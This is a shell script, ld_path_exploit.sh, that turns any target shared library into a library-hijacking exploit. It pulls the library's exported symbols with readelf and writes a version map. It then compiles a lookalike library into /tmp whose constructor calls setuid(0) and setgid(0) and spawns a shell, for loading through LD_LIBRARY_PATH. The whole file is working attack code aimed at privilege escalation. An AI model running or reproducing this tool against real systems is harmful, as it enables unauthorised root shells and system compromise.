#!/bin/sh

# ./ld_path_exploit.sh /usr/lib/libgpg-error.so.0 top

TARGET_LIB=$1

MISSING_SYMBOLS="$(readelf -s --wide ${TARGET_LIB} \
                   | grep 'FUNC\|OBJECT' \
                   | grep -v 'UND\|ABS' \
                   | awk '{print $8}' \
                   | sed 's/@@/ /g')"
                   
LIBS="$(echo "${MISSING_SYMBOLS}" \
        | awk '{print $2}' \
        | sort -u)"


# ------------------------------------------------------------------------------
# C code with malicious library
# ------------------------------------------------------------------------------
cat << EOF > /tmp/hax.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
static void runmahpayload () __attribute__((constructor));
$(echo "${MISSING_SYMBOLS}" \
  | awk '{print $1}' \
  | grep -v '\.\|@' \
  | sed -e 's/^/int /g' -e 's/$/;/g')
void runmahpayload () {
  /* Malicious code HERE! */
  setuid(0);
  setgid(0);
  printf("DLL HIJACKING IN PROGRESS\n");
  system("sh");
}
EOF
# ------------------------------------------------------------------------------


# ------------------------------------------------------------------------------
# MAP file with library symbols
# ------------------------------------------------------------------------------
rm -f /tmp/hax.map
for lib in ${LIBS}; do
  echo "${lib} {"
  echo "${MISSING_SYMBOLS}" \
  | grep "${lib}" \
  | awk '{print $1}' \
  | grep -v '\.\|@' \
  | sed 's/$/;/g'
  echo "};"
done > /tmp/hax.map
# ------------------------------------------------------------------------------


gcc_params="$([ -s /tmp/hax.map ] && echo "-Wl,-version-script /tmp/hax.map")"
rm -f /tmp/*.so*
gcc -fPIC -shared $gcc_params -o /tmp/"$(basename ${TARGET_LIB})" /tmp/hax.c

#eval LD_LIBRARY_PATH=/tmp/ $@
